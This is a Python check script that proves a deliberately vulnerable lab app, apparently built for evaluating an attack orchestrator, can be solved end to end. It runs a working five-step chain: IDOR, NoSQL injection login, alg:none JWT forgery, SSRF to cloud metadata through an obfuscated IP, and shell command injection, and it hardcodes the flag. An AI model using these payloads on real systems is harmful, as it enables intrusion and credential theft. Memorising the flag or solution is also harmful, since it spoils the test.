"""Deterministic solve-path check for gauntlet_app.py — proves the 5-stage chain is
solvable (a broken target would invalidate the orchestrator A/B). Stdlib only.

Run: docker run -d --rm --name gv -e APP=gauntlet_app.py -p 5099:5000 vuln-target:latest
     ./.venv/bin/python targets/verify_gauntlet.py   # then: docker rm -f gv
"""
import base64, json, sys, urllib.request as u

B = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5099"
FLAG = "flag{g4untl3t_1dor_nosql_jwt_ssrf_rce_cha1n}"


def call(path, data=None, headers=None, params=None):
    url = B + path + ("?" + "&".join(f"{k}={v}" for k, v in params.items()) if params else "")
    req = u.Request(url, data=json.dumps(data).encode() if data is not None else None,
                    headers=headers or {}, method="POST" if data is not None else "GET")
    if data is not None:
        req.add_header("Content-Type", "application/json")
    try:
        return json.loads(u.urlopen(req, timeout=8).read())
    except u.HTTPError as e:
        return json.loads(e.read())


def forge(claims):  # alg:none JWT
    h = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b'=').decode()
    return f"{h}.{p}."


def main():
    assert call("/api/users/7")["user"]["username"] == "svc_backup", "S1 IDOR"
    s = call("/api/login", data={"username": "svc_backup", "password": {"$ne": "x"}})
    assert s.get("session"), "S2 NoSQLi"
    assert call("/api/session", params={"session": s["session"]}).get("jwt"), "S3 JWT issue"
    admin = {"Authorization": "Bearer " + forge({"user": "svc_backup", "role": "admin"})}
    f = call("/api/admin/fetch", params={"url": "http://2852039166/latest/meta-data/"},
             headers=admin)
    dk = f["data"]["iam"]["deploy_key"]
    assert dk, "S4 SSRF"
    r = call("/api/admin/deploy", data={"deploy_key": dk, "host": "127.0.0.1;cat /flag"},
             headers=admin)
    assert FLAG in r.get("stdout", ""), "S5 RCE"
    print("verify_gauntlet.py ok — full chain solvable, flag recovered")


if __name__ == "__main__":
    main()
